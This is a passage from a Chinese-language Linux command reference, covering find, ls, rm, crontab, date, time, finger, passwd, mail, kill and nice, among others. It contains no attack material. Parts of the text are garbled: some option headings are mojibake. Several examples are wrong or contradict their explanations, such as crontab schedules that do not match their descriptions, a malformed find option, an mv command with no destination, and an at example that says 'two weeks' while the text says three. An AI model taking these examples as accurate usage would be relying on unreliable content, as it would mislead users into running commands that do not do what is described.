或是 group 名称是 name 　-ipath p, -path p:路径名称符合 p 的档案,ipath 会忽略大小写 　-name name, -iname name:档案名称符合 name 的档案。iname 会忽略大小写 　-size n:档案大小 是 n 单位,b 代表 512 位元组的区块,c 表示字元数,k 表示 kilo bytes,w 是二个位元组。-type c:档案类型是 c 的档案。 　d: 目录 　c: 字型装置档案 　b: 区块装置档案 　p: 具名贮列 　f: 一般档案 　l: 符号连结 　s: socket 　-pid n:process id 是 n 的档案 　你可以使用 ( ) 将运算式分隔,并使用下列运算。 　exp1 -and exp2 　! expr 　-not expr 　exp1 -or exp2 　exp1, exp2 　范例: 　将目前目录及其子目录下所有延伸档名是 c 的档案列出来。 find . -name \"*.c\" 　将目前目录其其下子目录中所有一般档案列出 find . -ftype f 将目前目录及其子目录下所有最近 20 分钟内更新过的档案列出 find . -ctime -20 　指令名称：less 　使用权限：所有使用者 　使用方式： 　less [Option] filename 　说明： 　less 的作用与 more 十分相似,都可以用来浏览文字档案的内容,不同的是 less 允许使用者往回卷动 　以浏览已经看过的部份,同时因为 less 并未在一开始就读入整个档案,因此在遇上大型档案的开启时,会比一般的文书编辑器(如 vi)来的快速。 　指令名称:ln 　使用权限:所有使用者 　使用方式:ln [options] source dist,其中 option 的格式为: 　[-bdfinsvF] [-S backup-suffix] [-V {numbered,existing,simple}] 　[--help] [--version] [--] 　说明:Linux/Unix 档案系统中,有所谓的连结(link),我们可以将其视为档案的别名,而连结又可分为两种:硬连结(hard link)与软连结(symbolic link),硬连结的意思是一个档案可以有多个名称,而软连结的方式则是产生一个特殊的档案,该档案的内容是指向另一个档案的位置。硬连结是存在同一个档案系统中,而软连结却可以跨越不同的档案系统。 　ln source dist 是产生一个连结(dist)到 source,至于使用硬连结或软链结则由参数决定。 　不论是硬连结或软链结都不会将原本的档案复制一份,只会占用非常少量的磁碟空间。 　-f:链结时先将与 dist 同档名的档案删除-d:允许系统管理者硬链结自己的目录-i:在删除与 dist 同档名的档案时先进行询问-n:在进行软连结时,将 dist 视为一般的档案-s:进行软链结(symbolic link)-v:在连结之前显示其档名-b:将在链结时会被覆写或删除的档案进行备份-S SUFFIX:将备份的档案都加上 SUFFIX 的字尾-V METHOD:指定备份的方式--help:显示辅助说明--version:显示版本 　范例: 　将档案 yy 产生一个 symbolic link:zz 　ln -s yy zz 　将档案 yy 产生一个 hard link:zz 　ln yy xx 　指令名称：locate 　使用权限：所有使用者 　使用方式： locate [-q] [-d ] [--database=] 　locate [-r ] [--regexp=] 　locate [-qv] [-o ] [--output=] 　locate [-e ] [-f ] 　locate [-Vh] [--version] [--help] 　说明： 　locate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的资料库,之后当寻找时就只需查询这个资料库,而不必实际深入档案系统之中了。在一般的 distribution 之中,资料库的建立都被放在 contab 中自动执行。 　一般使用者在使用时只要用 locate your_file_name 的型式就可以了。 参数： 　-u 　-U 　建立资料库,-u 会由根目录开始,-U 则可以指定开始的位置。 　-e 　将排除在寻找的范围之外。 　-l 　如果 是 1．则启动安全模式。在安全模式下,使用者不会看到权限无法看到的档案。这会始速度减慢,因为 locate 必须至实际的档案系统中取得档案的权限资料。 　-f 　将特定的档案系统排除在外,例如我们没有到理要把 proc 档案系统中的档案放在资料库中。 　-q 　安静模式,不会显示任何错误讯息。 　-n 　至多显示 个输出。 　-r 　使用正规运算式 做寻找的条件。 　-o 　指定资料库存的名称。 　-d 　指定资料库的路径 　-h 　显示辅助讯息 　-v 　显示更多的讯息 　-V 　显示程式的版本讯息 范例： 　locate chdrv:寻找所有叫 chdrv 的档案 　locate -n 100 a.out:寻找所有叫 a.out 的档案,但最多只显示 100 个 　locate -u:建立资料库 　指令名称:ls 　使用权限:所有使用者 　使用方式:ls [-alrtAFR] [name...] 　说明:显示指定工作目录下之内容（列出目前工作目录所含之档案及子目录)。 　-a 显示所有档案及目录 (ls内定将档案名或目录名称开头为\".\"的视为隐藏档,不会列出) 　-l 除档案名称外,亦将档案型态,权限,拥有者,档案大小等资讯详细列出 　-r 将档案以相反次序显示(原定依英文字母次序) 　-t 将档案依建立时间之先后次序列出 　-A 同 -a ,但不列出 \".\" (目前目录) 及 \"..\" (父目录) 　-F 在列出的档案名称后加一符号；例如可执行档则加 \"*\", 目录则加 \"/\" 　-R 若目录下有档案,则以下之档案亦皆依序列出 　范例： 　列出目前工作目录下所有名称是 s 开头的档案,愈新的排愈后面: 　ls -ltr s* 　将 /bin 目录以下所有目录及档案详细资料列出: 　ls -lR /bin 　列出目前工作目录下所有档案及目录；目录于名称后加 \"/\", 可执行档于名称后加 \"*\": 　ls -AF 　指令名称：more 　使用权限：所有使用者 　使用方式：more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..] 　说明：类似 cat ,不过会以一页一页的显示方便使用者逐页阅读,而最基本的指令就是按空白键（space）就往下一页显示,按 b 键就会往回（back）一页显示,而且还有搜寻字串的功能（与 vi 相似）,使用中的说明文件,请按 h 。 　参数：-num 一次显示的行数 　-d 提示使用者,在画面下方显示 [Press space to continue, q to quit.] ,如果使用者按错键,则会显示 [Press h for instructions.] 而不是 哔 声 　-l 取消遇见特殊字元 ^L（送纸字元）时会暂停的功能 　-f 计算行数时,以实际上的行数,而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上） 　-p 不以卷动的方式显示每一页,而是先清除萤幕后再显示内容 　-c 跟 -p 相似,不同的是先显示内容再清除其他旧资料 　-s 当遇到有连续两行以上的空白行,就代换为一行的空白行 　-u 不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同） 　+/ 在每个档案显示前搜寻该字串（pattern）,然后从该字串之后开始显示 　+num 从第 num 行开始显示 　fileNames 欲显示内容的档案,可为复数个数 　范例： 　more -s testfile 逐页显示 testfile 之档案内容,如有连续两行以上空白行则以一行空白行显示。 　more +20 testfile 从第 20 行开始显示 testfile 之档案内容。 　指令名称：mv 　使用权限：所有使用者 　使用方式： 　mv [options] source dest 　mv [options] source... directory 　说明：将一个档案移至另一档案,或将数个档案移至另一目录。 　参数：-i 若目的地已有同名档案,则先询问是否覆盖旧档。 　范例： 　将档案 aaa 更名为 bbb: 　mv aaa bbb 　将所有的C语言程式移至 Finished 子目录中: 　mv -i *.c 　指令名称：rm 　使用权限：所有使用者 　使用方式：rm [ptions] name... 　说明：删除档案及目录。 　把计: 　-i 删除前逐一询问确认。 　-f 即使原档案属性设为唯读,亦直接删除,无需逐一确认。 　-r 将目录及以下之档案亦逐一删除。 　范例： 　删除所有C语言程式档；删除前逐一询问确认: 　rm -i *.c 　将 Finished 子目录及子目录中所有档案删除: 　rm -r Finished 　指令名称：rmdir 　使用权限：于目前目录有适当权限的所有使用者 　使用方式： rmdir [-p] dirName 　说明： 删除空的目录。 　参数： -p 是当子目录被删除后使它也成为空目录的话,则顺便一并删除。 　范例： 　将工作目录下,名为 AAA 的子目录删除: 　rmdir AAA 　在工作目录下的 BBB 目录中,删除名为 Test 的子目录。若 Test 删除后,BBB 目录成为空目录,则 BBB 亦予删除。 　rmdir -p BBB/Test 　指令名称：split 　使用权限：所有使用者 　使用方式：split [OPTION] [INPUT [PREFIX]]说明： 　将一个档案分割成数个。而从 INPUT 分割输出成固定大小的档案,其档名依序为 PREFIXaa, PREFIXab...；PREFIX 预设值为 `x。若没有 INPUT 档或为 `-,则从标准输入读进资料。 　匡兜: 　-b, --bytes=SIZE 　SIZE 值为每一输出档案的大小,单位为 byte。 　-C, --line-bytes=SIZE 　每一输出档中,单行的最大 byte 数。 　-l, --lines=NUMBER 　NUMBER 值为每一输出档的列数大小。 　-NUMBER 　与 -l NUMBER 相同。 　--verbose 　于每个输出档被开启前,列印出侦错资讯到标准错误输出。 　--help 　显示辅助资讯然后离开。 　--version 　列出版本资讯然后离开。 　SIZE 可加入单位: b 代表 512, k 代表 1K, m 代表 1 Meg。 　范例： 　PostgresSQL 大型资料库备份与回存： 　因 Postgres 允许表格大过你系统档案的最大容量,所以要将表格 dump 到单一的档案可能会有问题,使用 split进行档案分割。 　% pg_dump dbname | split -b 1m - filename.dump. 　重新载入 　% createdb dbname 　% cat filename.dump.* | pgsql dbname 　指令名称：touch 　 使用权限：所有使用者 　使用方式： 　touch [-acfm] 　[-r reference-file] [--file=reference-file] 　[-t MMDDhhmm[[CC]YY][.ss]] 　[-d time] [--date=time] [--time={atime,access,use,mtime,modify}] 　[--no-create] [--help] [--version] 　file1 [file2 ...] 　说明： 　touch 指令改变档案的时间记录。 ls -l 可以显示档案的时间记录。 　参数： 　a 改变档案的读取时间记录。 　m 改变档案的修改时间记录。 　c 假如目的档案不存在,不会建立新的档案。与 --no-create 的效果一样。 　f 不使用,是为了与其他 unix 系统的相容性而保留。 　r 使用参考档的时间记录,与 --file 的效果一样。 　d 设定时间与日期,可以使用各种不同的格式。 　t 设定档案的时间记录,格式与 date 指令相同。 　--no-create 不会建立新档案。 　--help 列出指令格式。 　--version 列出版本讯息。 　范例： 　最简单的使用方式,将档案的时候记录改为现在的时间。若档案不存在,系统会建立一个新的档案。 　touch file 　touch file1 file2 　将 file 的时间记录改为 5 月 6 日 18 点 3 分,公元两千年。时间的格式可以参考 date 指令,至少需输入 MMDDHHmm ,就是月日时与分。 　touch -c -t 05061803 file 　touch -c -t 050618032000 file 　将 file 的时间记录改变成与 referencefile 一样。 　touch -r referencefile file 　将 file 的时间记录改成 5 月 6 日 18 点 3 分,公元两千年。时间可以使用 am, pm 或是 24 小时的格式,日期可以使用其他格式如 6 May 2000 。 　touch -d \"6:03pm\" file 　touch -d \"05/06/2000\" file 　touch -d \"6:03pm 05/06/2000\" file 　指令名称:at 使用权限:所有使用者 　使用方式:at -V [-q queue] [-f file] [-mldbv] TIME 　说明:at 可以让使用者指定在 TIME 这个特定时刻执行某个程式或指令,TIME 的格式是 HH:MM其中的 HH 为小时,MM 为分钟,甚至你也可以指定 am, pm, midnight, noon, teatime(就是下午 4 点锺)等口语词。 　如果想要指定超过一天内的时间,则可以用 MMDDYY 或者 MM/DD/YY 的格式,其中 MM 是分钟,DD 是第几日,YY 是指年份。另外,使用者甚至也可以使用像是 now + 时间间隔来弹性指定时间,其中的时间间隔可以是 minutes, hours, days, weeks 　另外,使用者也可指定 today 或 tomorrow 来表示今天或明天。当指定了时间并按下 enter 之后,at 会进入交谈模式并要求输入指令或程式,当你输入完后按下 ctrl+D 即可完成所有动作,至于执行的结果将会寄回你的帐号中。 　把计: 　-V:印出版本编号 　-q:使用指定的伫列(Queue)来储存,at 的资料是存放在所谓的 queue 中,使用者可以同时使用多个 queue,而 queue 的编号为 a, b, c... z 以及 A, B, ... Z 共 52 个 　-m:即使程式/指令执行完成后没有输出结果, 也要寄封信给使用者 　-f file:读入预先写好的命令档。使用者不一定要使用交谈模式来输入,可以先将所有的指定先写入档案后再一次读入 　-l:列出所有的指定 (使用者也可以直接使用 atq 而不用 at -l) 　-d:删除指定 (使用者也可以直接使用 atrm 而不用 at -d) 　-v:列出所有已经完成但尚未删除的指定 　例子: 　三天后的下午 5点钟执行 /bin/ls: 　at 5pm + 3 days /bin/ls 　三个星期后的下午 5 点锺执行 /bin/ls: 　at 5pm + 2 weeks /bin/ls 　明天的 17:20 执行 /bin/date: 　at 17:20 tomorrow /bin/date 　1999 年的最后一天的最后一分钟印出 the end of world ! 　at 23:59 12/31/1999 echo the end of world ! 　指令名称：cal 　使用权限：所有使用者 　使用方式：cal [-mjy] [month [year]] 　说明： 　显示日历。若只有一个参数,则代表年份(1-9999),显示该年的年历。年份必须全部写出：``cal 89\\ 将不会是显示 1989 年的年历。使用两个参数,则表示月份及年份。若没有参数则显示这个月的月历。 　1752 年 9 月第 3 日起改用西洋新历,因这时大部份的国家都采用新历,有 10 天被去除,所以该月份的月历有些不同。在此之前为西洋旧历。 　匡兜: 　-m:以星期一为每周的第一天方式显示。 　-j:以凯撒历显示,即以一月一日起的天数显示。 　-y:显示今年年历。 　范例： 　cal:显示本月的月历。 　[root@mylinux /root]# date 　Tue Aug 15 08:00:18 CST 2000 　[root@mylinux /root]# cal 　August 2000 　Su Mo Tu We Th Fr Sa 　1 2 3 4 5 　6 7 8 9 10 11 12 　13 14 15 16 17 18 19 　20 21 22 23 24 25 26 　27 28 29 30 31 　[root@mylinux /root]# 　cal 2001:显示公元 2001 年年历。 　[root@mylinux /root]# cal 2001 　2001 　[root@mylinux /root]# 　cal 5 2001:显示公元 2001 年 5 月月历。 # cal 5 2001 cal -m:以星期一为每周的第一天方式,显示本月的月历。 # cal -m cal -jy:以一月一日起的天数显示今年的年历。 # cal -jy 　指令名称:crontab 　使用权限:所有使用者 　使用方式: 　crontab [ -u user ] filecrontab [ -u user ] { -l | -r | -e } 　说明: 　crontab 是用来让使用者在固定时间或固定间隔执行程式之用,换句话说,也就是类似使用者的时程表。-u user 是指设定指定 user 的时程表,这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话,就是表示设定自己的时程表。 　参数: 　-e:执行文字编辑器来设定时程表,内定的文字编辑器是 VI,如果你想用别的文字编辑器,则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe) 　-r:删除目前的时程表 　-l:列出目前的时程表 　时程表的格式如下: 　f1 f2 f3 f4 f5 program 　其中 f1 是表示分钟,f2 表示小时,f3 表示一个月份中的第几日,f4 表示月份,f5 表示一个星期中的第几天。program 表示要执行的程式。 　当 f1 为 * 时表示每分钟都要执行 program,f2 为 * 时表示每小时都要执行程式,其余类推 　当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行,f2 为 a-b 时表示从第 a 到第 b 小时都要执行,其余类推 　当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次,f2 为 */n 表示每 n 小时个时间间隔执行一次,其余类推 　当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行,f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行,其余类推 　使用者也可以将所有的设定先存放在档案 file 中,用 crontab file 的方式来设定时程表。 　例子: 　每月每天每小时的第 0 分钟执行一次 /bin/ls: 　0 7 * * * /bin/ls 　在 12 月内, 每天的早上 6 点到 12 点中,每隔 20 分钟执行一次 /usr/bin/backup: 　0 6-12/3 * 12 * /usr/bin/backup 　周一到周五每天下午 5:00 寄一封信给 alex@domain.name: 　0 17 * * 1-5 mail -s \"hi\" alex@domain.name /dev/null 2>&1 即可。 　指令名称:date 　使用权限:所有使用者 　使用方式: 　date [-u] [-d datestr] [-s datestr] [--utc] [--universal] [--date=datestr] [--set=datestr] [--help] [--version] [+FORMAT] [MMDDhhmm[[CC]YY][.ss]] 　说明: 　date 可以用来显示或设定系统的日期与时间,在显示方面,使用者可以设定欲显示的格式,格式设定为一个加号后接数个标记,其中可用的标记列表如下: 　时间方面: 　%:印出 % 　%n:下一行 　%t:跳格 　%H:小时(00..23) 　%I:小时(01..12) 　%k:小时(0..23) 　%l:小时(1..12) 　%M:分钟(00..59) 　%p:显示本地 AM 或 PM 　%r:直接显示时间 (12 小时制,格式为 hh:mm:ss [AP]M) 　%s:从 1970 年 1 月 1 日 00:00:00 UTC 到目前为止的秒数 　%S:秒(00..61) 　%T:直接显示时间 (24 小时制) 　%X:相当于 %H:%M:%S 　%Z:显示时区 　日期方面: 　%a:星期几 (Sun..Sat) 　%A:星期几 (Sunday..Saturday) 　%b:月份 (Jan..Dec) 　%B:月份 (January..December) 　%c:直接显示日期与时间 　%d:日 (01..31) 　%D:直接显示日期 (mm/dd/yy) 　%h:同 %b 　%j:一年中的第几天 (001..366) 　%m:月份 (01..12) 　%U:一年中的第几周 (00..53) (以 Sunday 为一周的第一天的情形) 　%w:一周中的第几天 (0..6) 　%W:一年中的第几周 (00..53) (以 Monday 为一周的第一天的情形) 　%x:直接显示日期 (mm/dd/yy) 　%y:年份的最后两位数字 (00.99) 　%Y:完整年份 (0000..9999) 　若是不以加号作为开头,则表示要设定时间,而时间格式为 MMDDhhmm[[CC]YY][.ss],其中 MM 为月份,DD 为日,hh 为小时,mm 为分钟,CC 为年份前两位数字,YY 为年份后两位数字,ss 为秒数 　把计: 　-d datestr:显示 datestr 中所设定的时间 (非系统时间) 　--help:显示辅助讯息 　-s datestr:将系统时间设为 datestr 中所设定的时间 　-u:显示目前的格林威治时间 　--version:显示版本编号 　例子: 　显示时间后跳行,再显示目前日期: 　date +%T%n%D 　显示月份与日数: 　date +%B %d 　显示日期与设定时间(12:34:56): 　date --date 12:34:56 　注意: 　当你不希望出现无意义的 0 时(比如说 1999/03/07),则可以在标记中插入 - 符号,比如说 date +%-H:%-M:%-S 会把时分秒中无意义的 0 给去掉,像是原本的 08:09:04 会变为 8:9:4。另外,只有取得权限者(比如说 root)才能设定系统时间。 　当你以 root 身分更改了系统时间之后,请记得以 clock -w 来将系统时间写入 CMOS 中,这样下次重新开机时系统时间才会持续抱持最新的正确值。 　 　指令名称:sleep 　使用权限:所有使用者 　使用方式:sleep [--help] [--version] number[smhd] 　说明:sleep 可以用来将目前动作延迟一段时间 　参数说明: 　--help:显示辅助讯息 　--version:显示版本编号 　number:时间长度,后面可接 s,m,h 或 d 　其中 s 为秒,m 为 分钟,h 为小时,d 为日数 　例子: 　显示目前时间后延迟 1 分钟,之后再次显示时间: 　date;sleep 1m;date 　指令名称： time 　 使用权限： 所有使用者 　使用方式： time [options] COMMAND [arguments] 　说明： 　time 指令的用途,在于量测特定指令执行时所需消耗的时间及系统资源等资讯。例如 CPU 时间,记忆体,输入输出等等。需要特别注意的是,部分资讯在 Linux 上显示不出来。这是因为在 Linux 上部分资源的分配函式与 time 指令所预设的方式并不相同,以致于 time 指令无法取得这些资料。 　把计: 　-o or --output=FILE 　设定结果输出档。这个选项会将 time 的输出写入 所指定的档案中。如果档案已经存在,系统将覆写其内容。 　-a or --append 　配合 -o 使用,会将结果写到档案的末端,而不会覆盖掉原来的内容。 　-f FORMAT or --format=FORMAT 　以 FORMAT 字串设定显示方式。当这个选项没有被设定的时候,会用系统预设的格式。不过你可以用环境变数 time 来设定这个格式,如此一来就不必每次登入系统都要设定一次。 　一般设定上,你可以用 　\\t 　表示跳栏,或者是用 　\\n 　表示换行。每一项资料要用 % 做为前导。如果要在字串中使用百分比符号,就用.（学过C语言的人大概会觉得很熟悉） 　time 指令可以显示的资源有四大项,分别是： 　Time resources 　Memory resources 　IO resources 　Command info 　详细的内容如下： 　Time Resources 　E 执行指令所花费的时间,格式是：[hour]:minute:second。请注意这个数字并不代表实际的 CPU 时间。 　e 执行指令所花费的时间,单位是秒。请注意这个数字并不代表实际的 CPU 时间。 　S 指令执行时在核心模式（kernel mode）所花费的时间,单位是秒。 　U 指令执行时在使用者模式（user mode）所花费的时间,单位是秒。 　P 执行指令时 CPU 的占用比例。其实这个数字就是核心模式加上使用者模式的 CPU 时间除以总时间。 　Memory Resources 　M 执行时所占用的实体记忆体的最大值。单位是 KB 　t 执行时所占用的实体记忆体的平均值,单位是 KB 　K 执行程序所占用的记忆体总量（stack+data+text）的平均大小,单位是 KB 　D 执行程序的自有资料区（unshared data area）的平均大小,单位是 KB 　p 执行程序的自有堆叠（unshared stack）的平均大小,单位是 KB 　X 执行程序间共享内容（shared text）的平均值,单位是 KB 　Z 系统记忆体页的大小,单位是 byte。对同一个系统来说这是个常数 　IO Resources 　F 此程序的主要记忆体页错误发生次数。所谓的主要记忆体页错误是指某一记忆体页已经置换到置换档（swap file)中,而且已经分配给其他程序。此时该页的内容必须从置换档里再读出来。 　R 此程序的次要记忆体页错误发生次数。所谓的次要记忆体页错误是指某一记忆体页虽然已经置换到置换档中,但尚未分配给其他程序。此时该页的内容并未被破坏,不必从置换档里读出来 　W 此程序被交换到置换档的次数 　c 此程序被强迫中断（像是分配到的 CPU 时间耗尽）的次数 　w 此程序自愿中断（像是在等待某一个 I/O 执行完毕,像是磁碟读取等等）的次数 　I 此程序所输入的档案数 　O 此程序所输出的档案数 　r 此程序所收到的 Socket Message 　s 此程序所送出的 Socket Message 　k 此程序所收到的信号 ( Signal )数量 　Command Info 　C 执行时的参数以及指令名称 　x 指令的结束代码 ( Exit Status ) 　-p or --portability 　这个选项会自动把显示格式设定成为： 　real %e 　user %U 　sys %S 　这么做的目的是为了与 POSIX 规格相容。 　-v or --verbose 　这个选项会把所有程式中用到的资源通通列出来,不但如一般英文语句,还有说明。对不想花时间去熟习格式设定或是刚刚开始接触这个指令的人相当有用。 　范例： 　利用下面的指令 　time -v ps -aux 　我们可以获得执行 ps -aux 的结果和所花费的系统资源。如下面所列的资料： 　USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND 　root 1 0.0 0.4 1096 472 ? S Apr19 0:04 init 　root 2 0.0 0.0 0 0 ? SW Apr19 0:00 [kflushd] 　root 3 0.0 0.0 0 0 ? SW Apr19 0:00 [kpiod] 　...... 　root 24269 0.0 1.0 2692 996 pts/3 R 12:16 0:00 ps -aux 　Command being timed: \"ps -aux\" 　User time (seconds): 0.05 　System time (seconds): 0.06 　Percent of CPU this job got: 68% 　Elapsed (wall clock) time (h:mm:ss or m:ss): 0:00.16 　Average shared text size (kbytes): 0 　Average unshared data size (kbytes): 0 　Average stack size (kbytes): 0 　Average total size (kbytes): 0 　Maximum resident set size (kbytes): 0 　Average resident set size (kbytes): 0 　Major (requiring I/O) page faults: 238 　Minor (reclaiming a frame) page faults: 46 　Voluntary context switches: 0 　Involuntary context switches: 0 　Swaps: 0 　File system inputs: 0 　File system outputs: 0 　Socket messages sent: 0 　Socket messages received: 0 　Signals delivered: 0 　Page size (bytes): 4096 　Exit status: 0 　使用权限： 所有使用者 　使用方式： uptime [-V] 　说明： uptime 提供使用者下面的资讯,不需其他参数： 　现在的时间 　系统开机运转到现在经过的时间 　连线的使用者数量 　最近一分钟,五分钟和十五分钟的系统负载 　参数： -V 显示版本资讯。 　范例： uptime 　其结果为： 　10:41am up 5 days, 10 min, 1 users, load average: 0.00, 0.00, 1.99 　指令名称：chfn 　 使用权限：所有使用者 　用法：shell>> chfn 　说明：提供使用者更改个人资讯,用于 finger and mail username 　范例： 　shell>> chfn 　Changing finger information for user 　Password: [del] 　Name[]:Johnney Huang ### 提供 finger 时的资料 　Office[]:NCCU 　Office Phone[]: [del] 　Home Phone[]: [del] 　指令名称：chsh 使用权限：所有使用者 　用法：shell>> chsh 　说明：更改使用者 shell 设定 　范例： 　shell>> chsh 　Changing fihanging shell for user1 　Password: [del] 　New shell [/bin/tcsh]: ### [是目前使用的 shell] 　[del] 　shell>> chsh -l ### 展示 /etc/shells 档案内容 　/bin/bash 　/bin/sh 　/bin/ash 　/bin/bsh 　/bin/tcsh 　/bin/csh 　” finger [返回] 　名称： finger 　使用权限： 所有使用者 　使用方式： finger [options] user[@address] 　说明：finger 可以让使用者查询一些其他使用者的资料。会列出来的资料有： 　Login Name 　User Name 　Home directory 　Shell 　Login status 　mail status 　.plan 　.project 　.forward 　其中 .plan ,.project 和 .forward 就是使用者在他的 Home Directory 里的 .plan , .project 和 .forward 等档案里的资料。如果没有就没有。finger 指令并不限定于在同一伺服器上查询,也可以寻找某一个远端伺服器上的使用者。只要给一个像是 E-mail address 一般的地址即可。 　把计: 　-l 　多行显示。 　-s 　单行显示。这个选项只显示登入名称,真实姓名,终端机名称,闲置时间,登入时间,办公室号码及电话号码。如果所查询的使用者是远端伺服器的使用者,这个选项无效。 　范例：下列指令可以查询本机管理员的资料： 　finger root 　其结果如下： 　Login: root Name: root 　Directory: /root Shell: /bin/bash 　Never logged in. 　No mail. 　No Plan. 　指令名称：last 　使用权限：所有使用者 　使用方式：shell>> last [options] 　说明：显示系统开机以来获是从每月初登入者的讯息 　把计: 　-R 省略 hostname 的栏位 　-num 展示前 num 个 　username 展示 username 的登入讯息 　tty 限制登入讯息包含终端机代号 　范例： 　shell>> last -R -2 　johnney pts/1 Mon Aug 14 20:42 still logged in 　johnney pts/0 Mon Aug 14 19:59 still logged in 　wtmp begins Tue Aug 1 09:01:10 2000 ### /var/log/wtmp 　shell>> last -2 minery 　minery pts/0 140.119.217.115 Mon Aug 14 18:37 - 18:40 (00:03) 　minery pts/0 140.119.217.115 Mon Aug 14 17:22 - 17:24 (00:02) 　wtmp begins Tue Aug 1 09:01:10 2000 　指令名称:login 　这个命令都不会就不要干算了！呵呵我也不在这里多费笔墨耽误大家美好青春了^_^ 　名称：passwd 　使用权限：所有使用者 　使用方式：passwd [-k] [-l] [-u [-f]] [-d] [-S] [username] 　说明：用来更改使用者的密码 　参数： 　-k 　-l 　-u 　-f 　-d 关闭使用者的密码认证功能, 使用者在登入时将可以不用输入密码, 只有具备 root 权限的使用者方可使用. 　-S 显示指定使用者的密码认证种类, 只有具备 root 权限的使用者方可使用. 　[username] 指定帐号名称. 　指令名称:who 　使用权线:所有使用者都可使用 　使用方式:who - [husfV] [user] 　说明:显示系统中有那些使用者正在上面,显示的资料包含了使用者 ID,使用的终端机,从那边连上来的,上线时间,呆滞时间,CPU 使用量,动作等等。 　把计: 　-h:不要显示标题列 　-u:不要显示使用者的动作/工作 　-s:使用简短的格式来显示 　-f:不要显示使用者的上线位置 　-V:显示程式版本 　指令名称：/etc/aliases 　使用权限：系统管理者 　使用方式： 请用 newaliases 更新资料库 　说明： 　sendmail 会使用一个在 /etc/aliases 中的档案做使用者名称转换的动作。当 sendmail 收到一个要送给 xxx 的信时,它会依据 aliases档的内容送给另一个使用者。这个功能可以创造一个只有在信件系统内才有效的使用者。例如 mailing list 就会用到这个功能,在 mailinglist 中,我们可能会创造一个叫 redlinux@link.ece.uci.edu 的 mailinglist,但实际上并没有一个叫 redlinux 的使用者。实际 aliases 档的内容是将送给这个使用者的信都收给 mailing list 处理程式负责分送的工作。 　/etc/aliases 是一个文字模式的档案,sendmail 需要一个二进位格式的 /etc/aliases.db。newaliases 的功能传是将 /etc/aliases 转换成一个 sendmail 所能了解的资料库。 范例： 　# newaliases 　下面命令会做相同的事, 　# sendmail -bi 　相关命令: 　mail, mailq, newaliases, sendmail 　” mail [返回] 　指令名称：mail 　使用权限：所有使用者 　使用方式：mail [-iInv] [-s subject] [-c cc-addr] [-b bcc-addr] user1 [user 2 ...] 　说明： 　mail 不仅只是一个指令, mail 还是一个电子邮件程式,不过利用 mail 来读信的人应该很少吧！对于系统管理者来说 mail 就很有用,因为管理者可以用 mail 写成 script ,定期寄一些备忘录提醒系统的使用者。 　参数： 　i 忽略 tty 的中断讯号。 (interrupt) 　I 强迫设成互动模式。 (Interactive) 　v 列印出讯息,例如送信的地点,状态等等。 (verbose) 　n 不读入 mail.rc 设定档。 　s 邮件标题。 　c cc 邮件地址。 　b bcc 邮件地址。 　范例： 　将信件送给一个或以上的电子邮件地址,由于没有加入其他的选项,使用者必须输入标题与信件的内容等。而 user2 没有主机位置,就会送给邮件伺服器的 user2 使用者。 　mail user1@email.address 　mail user1@email.address user2 　将 mail.txt 的内容寄给 user2 同时 cc 给 user1 。如果将这一行指令设成 cronjob 就可以定时将备忘录寄给系统使用者。 　mail -s 标题 -c user1 user2 　指令：mesg 　 使用权限:所有使用者 　使用方式:mesg [y|n] 　说明 ： 决定是否允许其他人传讯息到自己的终端机介面 　把计 : 　y:允许讯息传到终端机介面上。 　n:不允许讯息传到终端机介面上 。 　如果没有设定,则讯息传递与否则由终端机界面目前状态而定。 　例子: 　改变目前讯息设定,改成不允许讯息传到终端机介面上: 　mesg n 　与 mesg 相关的指令有： talk,write,wall。 　指令名称:wall 　 使用权限:所有使用者 　使用方式: 　wall [ message ] 　使用说明： 　wall 会将讯息传给每一个 mesg 设定为 yes 的上线使用者。当使用终端机介面做为标准传入时, 讯息结束时需加上 EOF (通常用 Ctrl+D) 　例子: 　传讯息\"hi\" 给每一个使用者: 　wall hi 　指令名称:write 　使用权限:所有使用者 　使用方式: 　write user [ttyname] 　说明:传讯息给其他使用者 　把计: 　user:预备传讯息的使用者帐号 　ttyname:如果使用者同时有两个以上的 tty 连线,可以自行选择合适的 tty 传讯息 　例子.1: 　传讯息给 Rollaend,此时 Rollaend 只有一个连线: 　write Rollaend 　接下来就是将讯息打上去,结束请按 ctrl+c 　例子.2 :传讯息给 Rollaend,Rollaend 的连线有 pts/2,pts/3: 　write Rollaend pts/2 　接下来就是将讯息打上去,结束请按 ctrl+c 　注意:若对方设定 mesg n,则此时讯席将无法传给对方 　指令名称：kill 　使用权限：所有使用者 　使用方式： 　kill [ -s signal | -p ] [ -a ] pid ... 　kill -l [ signal ] 　说明：kill 送出一个特定的信号 (signal) 给行程 id 为 pid 的行程根据该信号而做特定的动作, 若没有指定, 预设是送出终止 (TERM) 的信号 　把计: 　-s (signal):其中可用的讯号有 HUP (1), KILL (9), TERM (15), 分别代表着重跑, 砍掉, 结束; 详细的信号可以用 kill -l 　-p:印出 pid , 并不送出信号 　-l (signal):列出所有可用的信号名称 　范例： 　将 pid 为 323 的行程砍掉 (kill): 　kill -9 323 　将 pid 为 456 的行程重跑 (restart): 　kill -HUP 456 　指令名称：nice 　使用权限：所有使用者 　使用方式：nice [-n adjustment] [-adjustment] [--adjustment=adjustment] [--help] [--version] [command [arg...]] 　说明：以更改过的优先序来执行程式, 如果未指定程式, 则会印出目前的排程优先序, 内定的 adjustment 为 10, 范围为 -20 (最高优先序) 到 19 (最低优先序) 　把计: 　-n adjustment, -adjustment, --adjustment=adjustment 皆为将该原有优先序的增加 adjustment 　--help 显示求助讯息 　--version 显示版本资讯 　范例： 　将 ls 的优先序加 1 并执行: 　nice -n 1 ls 　将 ls 的优先序加 10 并执行: 　nice ls将 ls 的优先序加 10 并执行 　注意:优先序 (priority) 为作业系统用来决定 CPU 分配的参数,Linux 使用『回合制(round-robin)』的演算法来做 CPU 排程,优先序越高,所可能获得的 CPU时间就越多。 　指令名称：ps 　 